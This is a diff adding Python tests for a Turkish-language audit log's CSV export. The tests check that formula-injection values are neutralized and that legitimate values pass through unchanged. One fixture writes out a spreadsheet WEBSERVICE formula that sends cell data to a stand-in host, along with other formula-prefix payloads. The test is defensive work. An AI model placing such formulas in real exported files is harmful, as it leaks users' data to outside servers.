@@ -206,3 +206,37 @@ def test_encrypted_audit_log_and_migration(tmp_path):
 
     with pytest.raises(ValueError):
         AuditLog(path, cipher_key=b"kisa")
+
+
+def test_csv_formula_cells_are_neutralized(tmp_path):
+    """Güvenlik taraması F15: çağırandan gelen metin elektronik tabloda formül olarak çalışmaz."""
+    import csv
+    import io
+
+    log = _log(tmp_path)
+    log.append("okuma", caller="ajan", agent='=WEBSERVICE("http://ornek.invalid/?"&D2)', result="reddedildi",
+               profile="+SUM(A1)", error="@cmd", source="-1+2")
+    log.append("okuma", caller="ajan", agent="\tsekme", profile="\rcr", result="basarili", source="D:/Arsiv/a.pdf")
+    rows = list(csv.reader(io.StringIO(to_csv(log.records())), delimiter=";"))
+    head = rows[0]
+    first, second = (dict(zip(head, r)) for r in rows[1:3])
+    assert first["agent"] == '\'=WEBSERVICE("http://ornek.invalid/?"&D2)'
+    assert first["profile"] == "'+SUM(A1)" and first["error"] == "'@cmd" and first["source"] == "'-1+2"
+    assert second["agent"] == "'\tsekme" and second["profile"] == "'\rcr"
+    for r in rows[1:]:
+        assert not any(c[:1] in "=+-@\t\r" for c in r if c)
+
+
+def test_csv_legit_values_unchanged(tmp_path):
+    log = _log(tmp_path)
+    log.append("maskeleme", caller="ajan", agent="claude-code", profile="Varsayılan", result="basarili",
+               source="D:/Arsiv/Fatura.xml", counts={"tc_kimlik": 2})
+    rec = log.records()[0]
+    import csv
+    import io
+
+    rows = list(csv.reader(io.StringIO(to_csv([rec])), delimiter=";"))
+    row = dict(zip(rows[0], rows[1]))
+    assert row["agent"] == "claude-code" and row["profile"] == "Varsayılan"
+    assert row["source"] == "D:/Arsiv/Fatura.xml" and row["counts"] == "tc_kimlik=2"
+    assert row["seq"] == str(rec["seq"]) and row["at"] == rec["at"] and row["hash"] == rec["hash"]
